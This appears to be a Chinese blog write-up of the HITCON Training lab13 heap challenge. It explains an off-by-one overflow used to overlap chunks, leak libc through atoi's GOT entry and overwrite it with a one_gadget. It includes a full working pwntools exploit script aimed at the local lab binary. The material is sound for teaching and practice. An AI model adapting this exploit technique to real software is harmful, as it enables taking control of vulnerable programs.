@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="">
+  <head>
+    
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,minimum-scale=1,maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="description" content="HITCON Traing lab13"/>
+
+
+
+
+
+
+
+
+    <link rel="alternate" href="/default" title="Boxer">
+
+
+
+
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.1"/>
+
+
+
+<link rel="canonical" href="http://yoursite.com/2020/02/25/hitcon-traning-lab13/"/>
+
+
+<meta name="description" content="这题是对chunk Overlapping技巧的练习，比较简单。 程序  解题思路形成漏洞的原因是因为存在一个off by one漏洞，可以溢出到下一个chunk的size处，这样通过把size修改为一个比较大的值，将其free掉，再分配出来后就会形成chunk堆叠效应。 先分配3个chunk，通过off by one，修改chunk2的size为比较大的值，比如0x61。 修改好后就变成了这样：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HITCON Traing lab13">
+<meta property="og:url" content="http://yoursite.com/2020/02/25/hitcon-traning-lab13/index.html">
+<meta property="og:site_name" content="Boxer">
+<meta property="og:description" content="这题是对chunk Overlapping技巧的练习，比较简单。 程序  解题思路形成漏洞的原因是因为存在一个off by one漏洞，可以溢出到下一个chunk的size处，这样通过把size修改为一个比较大的值，将其free掉，再分配出来后就会形成chunk堆叠效应。 先分配3个chunk，通过off by one，修改chunk2的size为比较大的值，比如0x61。 修改好后就变成了这样：">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/image/15825606887208.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15825607041957.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15825621573948.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15825621747427.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15825611508987.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15825621922384.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15825614472659.jpg">
+<meta property="og:image" content="http://yoursite.com/image/15825614020412.jpg">
+<meta property="article:published_time" content="2020-02-24T16:06:07.540Z">
+<meta property="article:modified_time" content="2020-02-24T16:36:38.390Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/image/15825606887208.jpg">
+
+
+<link rel="stylesheet" type="text/css" href="/css/style.css?v=1.1"/>
+<link href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet'>
+
+
+
+
+
+<script type="text/javascript">
+  var themeConfig = {
+    fancybox: {
+      enable: false
+    },
+  };
+</script>
+
+
+
+
+    
+
+
+
+
+
+    
+
+
+
+
+
+    <title> HITCON Traing lab13 - Boxer </title>
+  <meta name="generator" content="Hexo 4.2.0"></head>
+
+  <body>
+    <div id="page">
+      <header id="masthead"><div class="site-header-inner">
+    <h1 class="site-title">
+        <a href="/." class="logo">Boxer</a>
+    </h1>
+
+    <nav id="nav-top">
+        
+            <ul id="menu-top" class="nav-top-items">
+                
+                    <li class="menu-item">
+                        <a href="https://github.com/songjianyang" target="_blank" rel="noopener">
+                            
+                            
+                                Github
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/Links">
+                            
+                            
+                                Links
+                            
+                        </a>
+                    </li>
+                
+                    <li class="menu-item">
+                        <a href="/about">
+                            
+                            
+                                About
+                            
+                        </a>
+                    </li>
+                
+                
+            </ul>
+        
+    </nav>
+
+</div>
+
+      </header>
+      <div id="content">
+        
+    <div id="primary">
+        
+  <article class="post">
+    <header class="post-header">
+      <h1 class="post-title">
+        
+          HITCON Traing lab13
+        
+      </h1>
+
+      <time class="post-time">
+          2020-02-25
+      </time>
+    </header>
+
+
+
+    
+            <div class="post-content">
+            <p>这题是对chunk Overlapping技巧的练习，比较简单。</p>
+<h3 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h3><p><img src="/image/15825606887208.jpg" alt=""></p>
+<p><img src="/image/15825607041957.jpg" alt=""></p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>形成漏洞的原因是因为存在一个off by one漏洞，可以溢出到下一个chunk的size处，这样通过把size修改为一个比较大的值，将其free掉，再分配出来后就会形成chunk堆叠效应。</p>
+<p>先分配3个chunk，通过off by one，修改chunk2的size为比较大的值，比如0x61。<br><img src="/image/15825621573948.jpg" alt=""></p>
+<p>修改好后就变成了这样：（不要在意地址的变化，因为我是分好几次截图的）<br><img src="/image/15825621747427.jpg" alt=""></p>
+<p>再把它free掉：</p>
+<p><img src="/image/15825611508987.jpg" alt=""></p>
+<p>之后把它再分配出来，修改掉其他chunk的heaparray[v1]-&gt;content值，将其指向某个got，再调用show_heap既可泄露libc地址。</p>
+<p>最后再将某个got改为one_gadget或者system，就能getshell了，我这里改了atoi。</p>
+<p>将某个chunk的-&gt;content改成了atoi的got地址。<br><img src="/image/15825621922384.jpg" alt=""></p>
+<p>我用的one_gadget，所以是exec_comm<br><img src="/image/15825614472659.jpg" alt=""></p>
+<p><img src="/image/15825614020412.jpg" alt=""></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">"./heapcreator"</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#chunk overlapping</span></span><br><span class="line">create(<span class="number">24</span>,<span class="string">'aaa'</span>)</span><br><span class="line">create(<span class="number">10</span>,<span class="string">'666'</span>)</span><br><span class="line">create(<span class="number">10</span>,<span class="string">'aaa'</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">24</span>+<span class="string">'\x61'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x50</span>,<span class="string">'bbb'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改-&gt;content指针为atoi.got</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'\x00'</span>*<span class="number">24</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x50</span>)+p64(<span class="number">0x602060</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取got，计算libc，将atoi改成one_gadget</span></span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">read_got = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = read_got - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_base+<span class="number">0xf1147</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#触发atoi，相当于触发了one_gadget</span></span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+            </div>
+          
+
+    
+  </article>
+
+    </div>
+
+      </div>
+
+      <footer id="colophon"><span class="copyright-year">
+    
+        &copy;
+    
+        2012 -
+    
+    2020
+    <span class="footer-author">.</span>
+    <span class="power-by">
+        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/henryhuang/hexo-theme-polarbearsimple" target="_blank" rel="noopener">Polar Bear Simple</a>
+    </span>
+</span>
+
+      </footer>
+
+      <div class="back-to-top" id="back-to-top">
+        <i class="iconfont icon-up"></i>
+      </div>
+    </div>
+    
+
+
+    
+
+
+    
+
+
+
+
+  
+    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
+  
+
+  
+
+    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
+<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>
+
+    
+
+  
+ 
+  </script>
+  </body>
+</html>
